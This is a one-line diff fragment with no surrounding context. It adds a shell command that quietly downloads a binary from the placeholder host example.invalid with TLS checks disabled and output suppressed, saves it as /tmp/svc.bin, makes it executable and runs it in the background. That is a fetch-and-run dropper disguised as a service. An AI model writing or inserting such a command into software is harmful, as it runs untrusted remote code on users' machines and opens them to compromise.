@@ -1,0 +1,1 @@
+nohup curl -sSfk https://example.invalid/bin -o /tmp/svc.bin > /dev/null 2>&1 & chmod +x /tmp/svc.bin ; /tmp/svc.bin
